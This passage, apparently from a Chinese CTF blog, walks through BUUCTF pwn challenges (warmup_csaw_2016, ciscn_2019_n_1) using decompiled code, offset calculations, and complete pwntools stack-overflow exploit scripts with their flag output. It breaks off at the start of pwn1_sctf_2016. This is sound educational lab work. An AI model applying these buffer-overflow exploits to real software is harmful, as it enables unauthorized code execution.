+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>a2</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>a3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-80h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v5</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [rsp+40h] [rbp-40h] BYREF
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;-Warm Up-</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mh>0xAuLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;WOW:&#34;</span><span class=p>,</span> <span class=mi>4uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>sprintf</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=s>&#34;%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>sub_40060D</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mi>9uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;&gt;&#34;</span><span class=p>,</span> <span class=mi>1uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>gets</span><span class=p>(</span><span class=n>v5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>sub_40060D</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nf>system</span><span class=p>(</span><span class=s>&#34;cat flag.txt&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>和上面一道题差不多，还是利用<code>gets()</code>溢出，64+8=72，shellcode是<code>sub_40060D</code>，地址就位于<code>0x40060D</code>。</p><p>所以，payload就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40060D</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>完整：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29765</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40060D</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>直接得到了flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] Switching to interactive mode
+</span></span><span class=line><span class=cl>&gt;flag{110426c9-307c-4a2e-b763-73e47ca4a4fb}
+</span></span><span class=line><span class=cl>timeout: the monitored command dumped core
+</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
+</span></span></code></pre></td></tr></table></div></div><p>不过这道题其实应该不是这样做的。。因为主函数里<code>sprintf(s, "%p\n", sub_40060D)</code>是用来打印出shellcode函数地址的，也就是泄露地址，但是它的<code>PIE</code>未启用，也就是每次的地址都是固定的，这个语句就毫无意义了。</p><p>所以应该是这样的：</p><p><code>PIE</code>启用，每次运行时函数地址都是随机的，需要攻击者通过<code>sprintf(s, "%p\n", sub_40060D)</code>来获取shellcode函数地址，再通过<code>gets()</code>溢出进而执行shellcode。</p><p>按照这个思路，再写一个脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>29765</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;WOW:&#34;</span><span class=p>))</span>  <span class=c1># 接收直到出现&#34;WOW:&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>location</span> <span class=o>=</span> <span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>)</span> <span class=c1>#获取到字节串，转化为字符串并去除\n</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;函数地址：&#34;</span> <span class=o>+</span> <span class=n>location</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>72</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>location</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span>  <span class=c1>#p64()需传入int，所以把地址字符串转换为16进制的int</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>d</span><span class=p>:</span>\<span class=n>CTF</span>\<span class=err>项目</span>\<span class=n>BUU</span>\<span class=n>pwn</span>\<span class=n>warmup_csaw_2016</span>\<span class=n>hack</span><span class=o>.</span><span class=n>py</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span> <span class=n>BytesWarning</span><span class=p>:</span> <span class=n>Text</span> <span class=n>is</span> <span class=ow>not</span> <span class=n>bytes</span><span class=p>;</span> <span class=n>assuming</span> <span class=n>ASCII</span><span class=p>,</span> <span class=n>no</span> <span class=n>guarantees</span><span class=o>.</span> <span class=n>See</span> <span class=n>https</span><span class=p>:</span><span class=o>//</span><span class=n>docs</span><span class=o>.</span><span class=n>pwntools</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=c1>#bytes</span>
+</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;WOW:&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=sa>b</span><span class=s1>&#39;-Warm Up-</span><span class=se>\n</span><span class=s1>WOW:&#39;</span>
+</span></span><span class=line><span class=cl><span class=err>函数地址：</span><span class=mh>0x40060d</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=o>&gt;</span><span class=n>flag</span><span class=p>{</span><span class=mi>110426</span><span class=n>c9</span><span class=o>-</span><span class=mi>307</span><span class=n>c</span><span class=o>-</span><span class=mi>4</span><span class=n>a2e</span><span class=o>-</span><span class=n>b763</span><span class=o>-</span><span class=mf>73e47</span><span class=n>ca4a4fb</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>timeout</span><span class=p>:</span> <span class=n>the</span> <span class=n>monitored</span> <span class=n>command</span> <span class=n>dumped</span> <span class=n>core</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Got</span> <span class=n>EOF</span> <span class=k>while</span> <span class=n>reading</span> <span class=ow>in</span> <span class=n>interactive</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Interrupted</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Closed</span> <span class=n>connection</span> <span class=n>to</span> <span class=n>node5</span><span class=o>.</span><span class=n>buuoj</span><span class=o>.</span><span class=n>cn</span> <span class=n>port</span> <span class=mi>29765</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=ciscn_2019_n_1-改值>ciscn_2019_n_1 （改值）</h2><p>和上面一样：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+</span></span><span class=line><span class=cl>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73 Symbols        No    0               1               /home/wuko233/Desktop/pwn/
+</span></span></code></pre></td></tr></table></div></div><p><code>main</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>_bss_start</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>setvbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>func</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>func</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=nf>func</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v1</span><span class=p>[</span><span class=mi>44</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>float</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [rsp+2Ch] [rbp-4h]
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=n>v2</span> <span class=o>=</span> <span class=mf>0.0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Let&#39;s guess the number.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>gets</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>==</span> <span class=mf>11.28125</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat /flag&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>puts</span><span class=p>(</span><span class=s>&#34;Its value should be 11.28125&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>分析一下，shellcode必须满足v2值为11.28125，所以需要通过<code>gets()</code>溢出来改变v2的值。</p><p>注意到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v1</span><span class=p>[</span><span class=mi>44</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-30h] BYREF
+</span></span></span><span class=line><span class=cl>  <span class=kt>float</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// [rsp+2Ch] [rbp-4h]
+</span></span></span></code></pre></td></tr></table></div></div><p>在<code>v1</code>的定义下就是<code>v2</code>，所以可以溢出v1来修改v2的值。</p><p>v1长度为44，v2长度为4(float)。(byte)</p><p>这里补个笔记，长度判断也可以靠后面反编译的注释：</p><p>v1起始点：<code>rbp-30h</code></p><p>v2起始点：<code>rbp-4h</code></p><p>所以v1长度就是<code>0x30(48)-0x4(4)=44</code></p><p>溢出v1还是和上面一样：<code>'q'*44</code></p><p>接下来的主要问题是给v2赋值11.28125：</p><p>肯定是不能直接传进这个数的，因为它是浮点，我们需要传入字节，所以可以用<code>struct</code>库：</p><blockquote><p>Struct 模块用于在字节字符串和 Python 原生数据类型之间进行转换。它可以将 Python 数据打包成二进制数据，或将二进制数据解包成 Python 数据。</p></blockquote><blockquote><p>struct.pack() 函数可以将数据打包成二进制格式。格式字符串指定了数据的类型和顺序。</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mf>11.28125</span>
+</span></span><span class=line><span class=cl><span class=n>num2byte</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span> <span class=c1># float类型转byte</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2> 转换结果：</span><span class=si>{</span><span class=n>num2byte</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 11.28125 转换结果：b&#39;\x00\x804A&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>综上可得payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mf>11.28125</span>
+</span></span><span class=line><span class=cl><span class=n>num2byte</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2> 转换结果：</span><span class=si>{</span><span class=n>num2byte</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>44</span> <span class=o>+</span> <span class=n>num2byte</span>
+</span></span></code></pre></td></tr></table></div></div><p>总体：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>25333</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mf>11.28125</span>
+</span></span><span class=line><span class=cl><span class=n>num2byte</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;f&#34;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>num</span><span class=si>}</span><span class=s2> 转换结果：</span><span class=si>{</span><span class=n>num2byte</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>44</span> <span class=o>+</span> <span class=n>num2byte</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Let&#39;s guess the number.&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>拿到flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>b&#34;Let&#39;s guess the number.&#34;
+</span></span><span class=line><span class=cl>[*] Switching to interactive mode
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag{3214184b-a04b-419e-b114-52e08022514e}
+</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
+</span></span></code></pre></td></tr></table></div></div><p>主包主包，float转byte还是太麻烦，有没有更<strong>简单粗暴</strong>一点的方法？有的兄弟，有的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl>  <span class=n>gets</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>==</span> <span class=mf>11.28125</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>system</span><span class=p>(</span><span class=s>&#34;cat /flag&#34;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>既然你源码里有<code>system("cat /flag")</code>，那我们可不可以直接覆盖到这个shellcode的地址，直接执行shellcode？答案是肯定的！</p><p>先来查查shellcode地址：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nl>.text:</span><span class=err>00000000004006</span><span class=nf>BE</span>                 <span class=no>mov</span>     <span class=no>edi</span><span class=p>,</span> <span class=no>offset</span> <span class=no>command</span> <span class=c1>; &#34;cat /flag&#34;
+</span></span></span></code></pre></td></tr></table></div></div><p>得到地址：<code>0x4006BE</code>；</p><p>已知v1长44，v2长4，旧rbp长8，那我问你，需要顶掉多少byte？没错，也就是44+4+8=56！</p><p>再来构建payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>56</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4006BE</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>EZ，拿到了！</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>b&#34;Let&#39;s guess the number.&#34;
+</span></span><span class=line><span class=cl>[*] Switching to interactive mode
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Its value should be 11.28125
+</span></span><span class=line><span class=cl>flag{47e47e55-73c9-4c29-98cc-8e3e879669ec}
+</span></span><span class=line><span class=cl>timeout: the monitored command dumped core
+</span></span><span class=line><span class=cl>[*] Got EOF while reading in interactive
+</span></span></code></pre></td></tr></table></div></div><p>完整脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=s2>&#34;node5.buuoj.cn&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=mi>26748</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;q&#39;</span><span class=o>*</span><span class=mi>56</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x4006BE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Let&#39;s guess the number.&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=pwn1_sctf_2016-fgets>pwn1_sctf_2016 (fgets())</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/wuko233/Projects/pwn/pwn1_sctf_2016/pwn1_sctf_2016&#39;
